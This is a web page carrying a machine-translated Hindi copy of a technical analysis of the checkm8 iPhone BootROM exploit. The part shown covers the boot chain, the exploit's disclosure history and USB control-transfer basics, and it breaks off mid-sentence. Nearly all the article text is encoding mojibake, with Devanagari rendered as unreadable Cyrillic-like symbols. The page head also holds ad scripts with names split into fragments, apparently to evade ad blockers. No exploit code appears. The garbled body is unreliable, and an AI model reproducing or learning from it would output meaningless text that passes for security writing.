<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ЁЯОТ ЁЯСиЁЯП╗тАНЁЯПл ЁЯСйЁЯП╗тАНЁЯФм рдЪреЗрдХрдо 8 рд╢реЛрд╖рдг рдХрд╛ рддрдХрдиреАрдХреА рд╡рд┐рд╢реНрд▓реЗрд╖рдг ЁЯФЮ ЁЯФа тЫ░я╕П</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="рдЙрдЪреНрдЪ рд╕рдВрднрд╛рд╡рдирд╛ рдХреЗ рд╕рд╛рде рдЖрдкрдиреЗ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╕рдирд╕рдиреАрдЦреЗрдЬ рдЪреЗрдХрдо 8 рд╢реЛрд╖рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реБрдирд╛ рд╣реИ, рдЬреЛ рдХрд┐ iPhone X рд╕рд╣рд┐рдд рдЕрдзрд┐рдХрд╛рдВрд╢ iDevices рдХреЗ BootROM рдореЗрдВ рдПрдХ BootROM рднреЗрджреНрдпрддрд╛ рдХ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>рдЪреЗрдХрдо 8 рд╢реЛрд╖рдг рдХрд╛ рддрдХрдиреАрдХреА рд╡рд┐рд╢реНрд▓реЗрд╖рдг</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/471668/"><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/3l/k0/i2/3lk0i27tlko9sqankyec8rouqhw.png"></div><br><p> рдЙрдЪреНрдЪ рд╕рдВрднрд╛рд╡рдирд╛ рдХреЗ рд╕рд╛рде рдЖрдкрдиреЗ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╕рдирд╕рдиреАрдЦреЗрдЬ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдЪреЗрдХрдо 8</a> рд╢реЛрд╖рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реБрдирд╛ рд╣реИ, рдЬреЛ рдХрд┐ <code>iPhone X</code> рд╕рд╣рд┐рдд рдЕрдзрд┐рдХрд╛рдВрд╢ iDevices рдХреЗ <code>BootROM</code> рдореЗрдВ рдПрдХ <code>BootROM</code> рднреЗрджреНрдпрддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред  рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ, рд╣рдо рд╢реЛрд╖рдг рдХрд╛ рдПрдХ рддрдХрдиреАрдХреА рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдкреНрд░рджрд╛рди рдХрд░реЗрдВрдЧреЗ рдФрд░ рднреЗрджреНрдпрддрд╛ рдХреЗ рдХрд╛рд░рдгреЛрдВ рдХреЛ рджреЗрдЦреЗрдВрдЧреЗред  рдХрд┐рд╕реА рдХреЛ рднреА рджрд┐рд▓рдЪрд╕реНрдкреА - рдХрдЯреМрддреА рдХреЗ рддрд╣рдд рдЖрдкрдХрд╛ рд╕реНрд╡рд╛рдЧрдд рд╣реИ! </p><a name="habracut"></a><br><p>  рдЖрдк рд▓реЗрдЦ рдХрд╛ рдЕрдВрдЧреНрд░реЗрдЬреА рд╕рдВрд╕реНрдХрд░рдг <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдпрд╣рд╛рдВ</a> рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред </p><br><h2 id="vvedenie">  рдкрд░рд┐рдЪрдп </h2><br><p>  рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдо iDevice рдмреВрдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╡рд░реНрдгрди рдХрд░реЗрдВрдЧреЗ рдФрд░ рдпрд╣ рдкрддрд╛ <code>BootROM</code> рдХрд┐ <code>BootROM</code> рдХрд┐рд╕ рд╕реНрдерд╛рди рдкрд░ рд╣реИ (рдЗрд╕реЗ <code>SecureROM</code> рднреА рдХрд╣рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ) рдФрд░ рдЗрд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреНрдпреЛрдВ рд╣реИред  рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдпрд╣рд╛рдБ рд╣реИ</a> ред  рд╕рд░рд▓реАрдХреГрдд рдмреВрдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдирд┐рдореНрдирд╛рдиреБрд╕рд╛рд░ рджрд░реНрд╢рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: </p><br><p><img src="https://habrastorage.org/webt/kh/xi/tl/khxitlvaiov5lgx4kt45cq3qng4.png"></p><br><p>  <code>BootROM</code> рд╡рд╣ рдкрд╣рд▓реА рдЪреАрдЬ рд╣реИ рдЬреЛ рдкреНрд░реЛрд╕реЗрд╕рд░ рдЪрд╛рд▓реВ рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдбрд┐рд╡рд╛рдЗрд╕ рдЪрд╛рд▓реВ рд╣реЛрддрд╛ рд╣реИред  <code>BootROM</code> рдореБрдЦреНрдп рдХрд╛рд░реНрдп: </p><br><ul><li>  рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХрд╛ рдкреНрд░рд╛рд░рдВрдн (рдЖрд╡рд╢реНрдпрдХ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рд░рдЬрд┐рд╕реНрдЯрд░ рд╕реЗрдЯ рдХрд░рдирд╛, <code>CPU</code> рдЗрдирд┐рд╢рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдирд╛ рдЖрджрд┐) </li><li>  рд▓реЛрдбрд┐рдВрдЧ рдХреЗ рдЕрдЧрд▓реЗ рдЪрд░рдг рдореЗрдВ рдирд┐рдпрдВрддреНрд░рдг рдХрд╛ рд╕рддреНрдпрд╛рдкрди рдФрд░ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг <br><ul><li>  <code>BootROM</code> <code>IMG3/IMG4</code> рдЫрд╡рд┐рдпреЛрдВ рдХреЗ рдкрд╛рд░реНрд╕рд┐рдВрдЧ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ </li><li>  <code>BootROM</code> рдореЗрдВ рдбрд┐рдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рдЫрд╡рд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП <code>GID</code> рдХреБрдВрдЬреА рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ </li><li>  рдЫрд╡рд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП, <code>Apple</code> рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЛ <code>BootROM</code> рдореЗрдВ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдФрд░ рдХреНрд░рд┐рдкреНрдЯреЛрдЧреНрд░рд╛рдлреА рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рд╣реИ </li></ul></li><li>  рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдпрджрд┐ рдЖрдЧреЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ ( <code>Device Firmware Update</code> , <code>DFU</code> ) </li></ul><br><p>  <code>BootROM</code> рдЖрдХрд╛рд░ рдмрд╣реБрдд рдЫреЛрдЯрд╛ рд╣реИ, рдФрд░ рдЗрд╕реЗ <code>iBoot</code> рдХрд╛ рдПрдХ рд╕реНрдЯреНрд░рд┐рдк-рдбрд╛рдЙрди рд╕рдВрд╕реНрдХрд░рдг рдХрд╣рд╛ рдЬрд╛ рд╕рдХрддрд╛ <code>iBoot</code> , рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ рдЕрдзрд┐рдХрд╛рдВрд╢ рд╕рд┐рд╕реНрдЯрдо рдФрд░ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛрдб рд╕рд╛рдЭрд╛ рдХрд░рддреЗ рд╣реИрдВред  рд╣рд╛рд▓рд╛рдБрдХрд┐, <code>iBoot</code> рд╡рд┐рдкрд░реАрдд, <code>BootROM</code> рдХреЛ рдЕрдкрдбреЗрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред  рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛ рдмрдирд╛рддреЗ рд╕рдордп рдЗрд╕реЗ рдЖрдВрддрд░рд┐рдХ рд░реАрдб-рдУрдирд▓реА рдореЗрдореЛрд░реА рдореЗрдВ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИред  <code>BootROM</code> рдмреВрдЯ рдЪреЗрди рдЯреНрд░рд╕реНрдЯ рдХрд╛ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рд░реВрдЯ рд╣реИред  рдЗрд╕рдореЗрдВ рдХрдордЬреЛрд░рд┐рдпрд╛рдВ рдЖрдЧреЗ рдХреА рдбрд╛рдЙрдирд▓реЛрдб рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдкрд╛рдиреЗ рдФрд░ рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░ рдЕрд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреА рд╣реИрдВред </p><br><p><img src="https://habrastorage.org/webt/9a/pr/po/9aprpovk-0wg8fs7uya3axvs86s.png"></p><br><h2 id="poyavlenie-checkm8">  рдЪреЗрдХрдо 8 рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ </h2><br><p>  27 рд╕рд┐рддрдВрдмрд░, 2019 рдХреЛ <code>checkm8</code> рд╢реЛрд╖рдг рдХреЛ рдЗрд╕рдХреЗ рд▓реЗрдЦрдХ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">axi0mX</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рджреНрд╡рд╛рд░рд╛ ipwndfu</a> рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рдерд╛ред рддрдм рдЙрдиреНрд╣реЛрдВрдиреЗ рдЕрдкрдиреЗ рдЯреНрд╡рд┐рдЯрд░ рдЕрдХрд╛рдЙрдВрдЯ рдкрд░ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдПрдХ</a> рдЕрдкрдбреЗрдЯ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдХреА рдШреЛрд╖рдгрд╛ рдХреА</a> , рдЬрд┐рд╕рдореЗрдВ рд╢реЛрд╖рдг рдФрд░ рдЕрддрд┐рд░рд┐рдХреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рд╡рд░реНрдгрди рдерд╛ред  рдЖрдк рдереНрд░реЗрдб рд╕реЗ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ <code>USB</code> рдХреЛрдб рдореЗрдВ <code>use-after-free</code> рднреЗрджреНрдпрддрд╛ 2018 рдХреА рдЧрд░реНрдорд┐рдпреЛрдВ рдореЗрдВ <code>iOS 12 beta</code> рд▓рд┐рдП рдЖрдИ-рдмреВрдЯ рдХреА рдкреИрдЪ-рдбрд┐рдлрд╛рдЗрдВрдЧ <code>iBoot</code> рджреМрд░рд╛рди рд▓реЗрдЦрдХ рджреНрд╡рд╛рд░рд╛ рдкрд╛рдИ рдЧрдИ рдереАред  рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, <code>BootROM</code> рдФрд░ <code>BootROM</code> рдореЗрдВ рдмрд╣реБрдд рд╕реЗ рд╕рдорд╛рди рдХреЛрдб рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ <code>USB</code> рдХреЗ рд▓рд┐рдП рдХреЛрдб рднреА рд╢рд╛рдорд┐рд▓ рд╣реИ, рдпрд╣реА рдХрд╛рд░рдг рд╣реИ рдХрд┐ рдпрд╣ рднреЗрджреНрдпрддрд╛ рднреА <code>BootROM</code> рд▓рд┐рдП рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╣реИред </p><br><p>  рдпрд╣ рд╢реЛрд╖рдг рдХреЛрдб рд╕реЗ рднреА рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рднреЗрджреНрдпрддрд╛ <code>DFU</code> рдореЗрдВ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред  рдпрд╣ рдПрдХ рдРрд╕реА рд╡рд┐рдзрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдЫрд╡рд┐ рдХреЛ <code>USB</code> рдорд╛рдзреНрдпрдо рд╕реЗ рдбрд┐рд╡рд╛рдЗрд╕ рдореЗрдВ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдмрд╛рдж рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред  рдпрд╣ рдЖрд╡рд╢реНрдпрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрджрд┐ рдЕрдкрдбреЗрдЯ рдЕрд╕рдлрд▓ рд╣реИред </p><br><p>  рдЙрд╕реА рджрд┐рди, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рд▓рд┐рдЯрд┐рд▓реИрд▓реЛ</a> рдиреЗ рдмрддрд╛рдпрд╛ рдХрд┐ рдЙрдиреНрд╣реЛрдВрдиреЗ рдорд╛рд░реНрдЪ рдореЗрдВ рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХреЛ рдкрд╛рдпрд╛ рдерд╛ рдФрд░ рдЗрд╕рдХреЗ рд╡рд┐рд╡рд░рдг рдХреЛ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">apollo.txt</a> рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд┐рдпрд╛ рдерд╛ред  <code>checkm8</code> рдХреЛрдб рдореЗрдВ рдХреНрдпрд╛ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рдХрд╛ рд╡рд░реНрдгрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рд╢реЛрд╖рдг рдХреЗ рд╡рд┐рд╡рд░рдг рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕реНрдкрд╖реНрдЯ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред  рдЗрд╕рд▓рд┐рдП, рд╣рдордиреЗ рдЗрд╕ рд▓реЗрдЦ рдХреЛ рд▓рд┐рдЦрдиреЗ рдХрд╛ рдирд┐рд░реНрдгрдп рд▓рд┐рдпрд╛ рдФрд░ <code>BootROM</code> рдореЗрдВ рдкреЗрд▓реЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рддрдХ рдХреЗ рд╕рдВрдЪрд╛рд▓рди рдХреЗ рд╕рднреА рд╡рд┐рд╡рд░рдгреЛрдВ рдХрд╛ рд╕рдорд╛рд╡реЗрд╢ рдХрд░рдиреЗ рдХрд╛ <code>BootROM</code> ред </p><br><p>  рд╣рдордиреЗ рдкрд╣рд▓реЗ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░рд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде-рд╕рд╛рде рдлрд░рд╡рд░реА 2018 рдореЗрдВ рд▓реАрдХ рд╣реБрдП <code>iBoot/SecureROM</code> рд╕реНрд░реЛрдд рдХреЛрдб рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдПрдХ рд╢реЛрд╖рдг рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд┐рдпрд╛ред  рд╣рдордиреЗ рдЕрдкрдиреЗ рдкрд░реАрдХреНрд╖рдг рдЙрдкрдХрд░рдг - <code>iPhone 7</code> ( <code>CPID:8010</code> ) рдкрд░ рдкреНрд░рдпреЛрдЧрд╛рддреНрдордХ рд░реВрдк рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдбреЗрдЯрд╛ рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ред  <code>checkm8</code> рдХрд╛ рдЙрдкрдпреЛрдЧ <code>checkm8</code> рд╣рдордиреЗ <code>SecureROM</code> рдФрд░ <code>SecureRAM</code> рдбрдВрдк рдХреЛ рдЗрд╕рд╕реЗ рд╣рдЯрд╛ рджрд┐рдпрд╛, рдЬрд┐рд╕рд╕реЗ рд╣рдореЗрдВ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдореЗрдВ рдорджрдж рдорд┐рд▓реАред </p><br><h2 id="neobhodimye-znaniya-o-usb">  рдЖрд╡рд╢реНрдпрдХ USB рдЬреНрдЮрд╛рди </h2><br><p>  рдкрддрд╛ рдЪрд▓рд╛ рднреЗрджреНрдпрддрд╛ <code>USB</code> рдХреЛрдб рдореЗрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдЬреНрдЮрд╛рди рдЖрд╡рд╢реНрдпрдХ рд╣реИред  рдЖрдк <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдпрд╣рд╛рдВ</a> рдкреВрд░рд╛ рд╕реНрдкреЗрд╕рд┐рдлрд┐рдХреЗрд╢рди рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрд╣ рдХрд╛рдлреА рдмрдбрд╝рд╛ рд╣реИред  рдПрдХ рдЙрддреНрдХреГрд╖реНрдЯ рд╕рд╛рдордЧреНрд░реА, рдЬреЛ рдЖрдЧреЗ рдХреА рд╕рдордЭ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╕реЗ рдЕрдзрд┐рдХ рд╣реИ, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдПрдХ рдирдЯрд╢реЗрд▓ рдореЗрдВ рдпреВрдПрд╕рдмреА рд╣реИ</a> ред  рдпрд╣рд╛рдВ рд╣рдо рдХреЗрд╡рд▓ рд╕рдмрд╕реЗ рдЖрд╡рд╢реНрдпрдХ рджреЗрддреЗ рд╣реИрдВред </p><br><p>  рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ <code>USB</code> рдбреЗрдЯрд╛ рдЯреНрд░рд╛рдВрд╕рдлрд░ рд╣реИрдВред  <code>DFU</code> рдХреЗрд╡рд▓ <code>Control Transfers</code> рдореЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ (рдЖрдк рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдпрд╣рд╛рдВ</a> рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ)ред  рдЗрд╕ рдореЛрдб рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ рд▓реЗрдирджреЗрди рдореЗрдВ рддреАрди рдЪрд░рдг рд╣реЛрддреЗ рд╣реИрдВ: </p><br><a name="setup_packet"></a><br><ul><li>  <code>Setup Stage</code> - рдЗрд╕ рд╕реНрддрд░ рдкрд░ рдПрдХ <code>SETUP</code> рдкреИрдХреЗрдЯ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреНрд╖реЗрддреНрд░ рд╣реЛрддреЗ рд╣реИрдВ: <br><ul><li>  <code>bmRequestType</code> - рдЕрдиреБрд░реЛрдз рдХреА рджрд┐рд╢рд╛, рдкреНрд░рдХрд╛рд░ рдФрд░ рд░рд┐рд╕реАрд╡рд░ рдХрд╛ рд╡рд░реНрдгрди рдХрд░рддрд╛ рд╣реИ </li><li>  <code>bRequest</code> - рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕рд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ </li><li>  <code>wValue</code> , <code>wIndex</code> - рдЕрдиреБрд░реЛрдз рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдЙрдирдХреА рдЕрд▓рдЧ рддрд░рд╣ рд╕реЗ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ </li><li>  <code>wLength</code> - <code>Data Stage</code> рдореЗрдВ рдкреНрд░рд╛рдкреНрдд / рдкреНрд░реЗрд╖рд┐рдд рдбреЗрдЯрд╛ рдХреА рд▓рдВрдмрд╛рдИ </li></ul></li><li>  <code>Data Stage</code> - рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рдЪрд░рдг рдЬрд┐рд╕ рдкрд░ рдбреЗрдЯрд╛ рдЯреНрд░рд╛рдВрд╕рдлрд░ рд╣реЛрддрд╛ рд╣реИред  рдкрд┐рдЫрд▓реЗ рдЪрд░рдг рд╕реЗ <code>SETUP</code> рдкреИрдХреЗрдЯ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдпрд╣ рд╣реЛрд╕реНрдЯ рд╕реЗ рдбрд┐рд╡рд╛рдЗрд╕ ( <code>OUT</code> ) рдпрд╛ рдЗрд╕рдХреЗ рд╡рд┐рдкрд░реАрдд ( <code>IN</code> ) рдбреЗрдЯрд╛ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред  рдбреЗрдЯрд╛ рдЫреЛрдЯреЗ рднрд╛рдЧреЛрдВ рдореЗрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ ( <code>Apple DFU</code> рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рдпрд╣ 0x40 рдмрд╛рдЗрдЯреНрд╕ рд╣реИ)ред <br><ul><li>  рдЬрдм рд╣реЛрд╕реНрдЯ рдбреЗрдЯрд╛ рдХреЗ рдЕрдЧрд▓реЗ рдмреИрдЪ рдХреЛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдПрдХ <code>OUT</code> рдЯреЛрдХрди рднреЗрдЬрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХреЗ рдмрд╛рдж рдбреЗрдЯрд╛ рд╕реНрд╡рдпрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред </li><li>  рдЬрдм рдореЗрдЬрдмрд╛рди рдбрд┐рд╡рд╛рдЗрд╕ рд╕реЗ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ <code>IN</code> рдЯреЛрдХрди рднреЗрдЬрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХреЗ рдЬрд╡рд╛рдм рдореЗрдВ рдбрд┐рд╡рд╛рдЗрд╕ рдбреЗрдЯрд╛ рднреЗрдЬрддрд╛ рд╣реИред </li></ul></li><li>  <code>Status Stage</code> - рдЕрдВрддрд┐рдо рдЪрд░рдг рдЬрд┐рд╕ рдкрд░ рдкреВрд░реЗ рд▓реЗрдирджреЗрди рдХреА рд╕реНрдерд┐рддрд┐ рдмрддрд╛рдИ рдЬрд╛рддреА рд╣реИред <br><ul><li>  <code>OUT</code> рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП, рд╣реЛрд╕реНрдЯ рдПрдХ <code>IN</code> рдЯреЛрдХрди рднреЗрдЬрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХреЗ рдЬрд╡рд╛рдм рдореЗрдВ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛ рд╢реВрдиреНрдп рд▓рдВрдмрд╛рдИ рдХрд╛ рдбреЗрдЯрд╛ рдкреИрдХреЗрдЯ рднреЗрдЬрдирд╛ рдЪрд╛рд╣рд┐рдПред </li><li>  <code>IN</code> рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП, рд╣реЛрд╕реНрдЯ рдПрдХ <code>OUT</code> рдЯреЛрдХрди рдФрд░ рдПрдХ рд╢реВрдиреНрдп-рд▓рдВрдмрд╛рдИ рдбреЗрдЯрд╛ рдкреИрдХреЗрдЯ рднреЗрдЬрддрд╛ рд╣реИред </li></ul></li></ul><br><p>  рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдЖрд░реЗрдЦ рдореЗрдВ <code>OUT</code> рдФрд░ <code>IN</code> рдХреНрд╡реЗрд░реА рджрд┐рдЦрд╛рдИ рдЬрд╛рддреА рд╣реИрдВред  рд╣рдордиреЗ рдЬрд╛рдирдмреВрдЭрдХрд░ рд╡рд┐рд╡рд░рдг рдФрд░ рдЗрдВрдЯрд░реИрдХреНрд╢рди рд╕реНрдХреАрдо рд╕реЗ <code>ACK</code> , <code>NACK</code> рдФрд░ рдЕрдиреНрдп рд╣реИрдВрдбрд╢реЗрдХ рдкреИрдХреЗрдЬ рд╣рдЯрд╛ рджрд┐рдП, рдХреНрдпреЛрдВрдХрд┐ 